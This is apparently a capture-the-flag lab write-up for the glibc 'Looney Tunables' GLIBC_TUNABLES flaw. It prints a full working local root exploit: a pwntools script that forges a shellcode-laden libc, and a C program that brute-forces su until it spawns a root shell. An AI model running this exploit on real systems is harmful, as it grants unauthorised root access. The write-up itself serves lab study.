# Looney tunable THM

To check the `.interp` section of an ELF file, you can use the following command.

```
readelf /usr/bin/man -p .interp
````

Result

```
nopriv@looneytunes:~$ readelf /usr/bin/man -p .interp

String dump of section '.interp':
  [     0]  /lib64/ld-linux-x86-64.so.2
```

We can also check which libraries are needed to run the `man` command by using the `ldd` command to get a list of dependncies.

```
nopriv@looneytunes:~$ ldd /usr/bin/man
	linux-vdso.so.1 (0x00007ffe09f3a000)
	libmandb-2.10.2.so => /usr/lib/man-db/libmandb-2.10.2.so (0x00007fb22c12d000)
	libman-2.10.2.so => /usr/lib/man-db/libman-2.10.2.so (0x00007fb22c0fd000)
	libz.so.1 => /lib/x86_64-linux-gnu/libz.so.1 (0x00007fb22c0db000)
	libpipeline.so.1 => /lib/x86_64-linux-gnu/libpipeline.so.1 (0x00007fb22c0ce000)
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb22bea6000)
	libgdbm.so.6 => /lib/x86_64-linux-gnu/libgdbm.so.6 (0x00007fb22be92000)
	libseccomp.so.2 => /lib/x86_64-linux-gnu/libseccomp.so.2 (0x00007fb22be72000)
	/lib64/ld-linux-x86-64.so.2 (0x00007fb22c257000)
```

We can see that `man` command depends on `libz.so.1` which can be found `/lib/x86_64-linux-gnu/libz.so.1`

```
libz is a compression library and it is used almost everywhere
```

### Using DT_RPATH to influence the Library Search Path

When compiling a program, you can specify additional paths where you want `ld.so` to look for libraries. 
These directories will embedded in your program'sELF file and parsed and used by `ld.so` when loading the executable.
This allows you to overried the default library search path and have your program search in an alternate location first.

Command to compile a program

```
gcc -Wl,--enable-new-dtags -Wl,-rpath=/tmp -o myapp myapp.c
```

Whenever `ld.so` loads your executable, it will first check `/tmp` for libraries, then default to the regular library search path.

### Modifying glibc Behaviour via GLIBC_TUNABLES

Once the dynamic linker `ld.so` executed, it checks specific environment variables called `GLIBC_TUNABLES`/
it allow developers t odynamically alter the runtime library behaviour.

Example on how this process works.

```
GLIBC_TUNABLES="malloc.check=1:malloc.tcache_max=128"
```

To check the version of GLIBC

```
ldd --version
```

By using provided python file, we will run it using command `python3 gen_libc.py`

```
#!/usr/bin/env python3

from pwn import *

context.os = "linux"
context.arch = "x86_64"

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
d = bytearray(open(libc.path, "rb").read())

sc = asm(shellcraft.setuid(0) + shellcraft.setgid(0) + shellcraft.sh())

orig = libc.read(libc.sym["__libc_start_main"], 0x10)
idx = d.find(orig)
d[idx : idx + len(sc)] = sc

open("./libc.so.6", "wb").write(d)
```

and we need to compile the provided c script using `gcc`

```
gcc -o exp exp.c
```

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <time.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/resource.h>
#include <sys/wait.h>

#define FILL_SIZE 0xd00
#define BOF_SIZE 0x600

// copied from somewhere, probably https://stackoverflow.com/a/11765441
int64_t time_us()
{
    struct timespec tms;

    /* POSIX.1-2008 way */
    if (clock_gettime(CLOCK_REALTIME, &tms))
    {
        return -1;
    }
    /* seconds, multiplied with 1 million */
    int64_t micros = tms.tv_sec * 1000000;
    /* Add full microseconds */
    micros += tms.tv_nsec / 1000;
    /* round up if necessary */
    if (tms.tv_nsec % 1000 >= 500)
    {
        ++micros;
    }
    return micros;
}

int main(void)
{
    char filler[FILL_SIZE], kv[BOF_SIZE], filler2[BOF_SIZE + 0x20], dt_rpath[0x20000];
    char *argv[] = {"/usr/bin/su", "--help", NULL};
    char *envp[0x1000] = {
        NULL,
    };

    // copy forged libc
    if (mkdir("\"", 0755) == 0)
    {
        int sfd, dfd, len;
        char buf[0x1000];
        dfd = open("\"/libc.so.6", O_CREAT | O_WRONLY, 0755);
        sfd = open("./libc.so.6", O_RDONLY);
        do
        {
            len = read(sfd, buf, sizeof(buf));
            write(dfd, buf, len);
        } while (len == sizeof(buf));
        close(sfd);
        close(dfd);
    } // else already exists, skip

    strcpy(filler, "GLIBC_TUNABLES=glibc.malloc.mxfast=");
    for (int i = strlen(filler); i < sizeof(filler) - 1; i++)
    {
        filler[i] = 'F';
    }
    filler[sizeof(filler) - 1] = '\0';

    strcpy(kv, "GLIBC_TUNABLES=glibc.malloc.mxfast=glibc.malloc.mxfast=");
    for (int i = strlen(kv); i < sizeof(kv) - 1; i++)
    {
        kv[i] = 'A';
    }
    kv[sizeof(kv) - 1] = '\0';

    strcpy(filler2, "GLIBC_TUNABLES=glibc.malloc.mxfast=");
    for (int i = strlen(filler2); i < sizeof(filler2) - 1; i++)
    {
        filler2[i] = 'F';
    }
    filler2[sizeof(filler2) - 1] = '\0';

    for (int i = 0; i < 0xfff; i++)
    {
        envp[i] = "";
    }

    for (int i = 0; i < sizeof(dt_rpath); i += 8)
    {
        *(uintptr_t *)(dt_rpath + i) = -0x14ULL;
    }
    dt_rpath[sizeof(dt_rpath) - 1] = '\0';

    envp[0] = filler;                               // pads away loader rw section
    envp[1] = kv;                                   // payload
    envp[0x65] = "";                                // struct link_map ofs marker
    envp[0x65 + 0xb8] = "\x30\xf0\xff\xff\xfd\x7f"; // l_info[DT_RPATH]
    envp[0xf7f] = filler2;                          // pads away :tunable2=AAA: in between
    for (int i = 0; i < 0x2f; i++)
    {
        envp[0xf80 + i] = dt_rpath;
    }
    envp[0xffe] = "AAAA"; // alignment, currently already aligned

    struct rlimit rlim = {RLIM_INFINITY, RLIM_INFINITY};
    if (setrlimit(RLIMIT_STACK, &rlim) < 0)
    {
        perror("setrlimit");
    }

    /*
    if (execve(argv[0], argv, envp) < 0) {
        perror("execve");
    }
    */

    int pid;
    for (int ct = 1;; ct++)
    {
        if (ct % 100 == 0)
        {
            printf("try %d\n", ct);
        }
        if ((pid = fork()) < 0)
        {
            perror("fork");
            break;
        }
        else if (pid == 0) // child
        {
            if (execve(argv[0], argv, envp) < 0)
            {
                perror("execve");
                break;
            }
        }
        else // parent
        {
            int wstatus;
            int64_t st, en;
            st = time_us();
            wait(&wstatus);
            en = time_us();
            if (!WIFSIGNALED(wstatus) && en - st > 1000000)
            {
                // probably returning from shell :)
                break;
            }
        }
    }

    return 0;
}
```

and running the exploit

```
./exp
```

This may take some time about 5 to 10 mins and we should get a root

```
# whoami
root
```


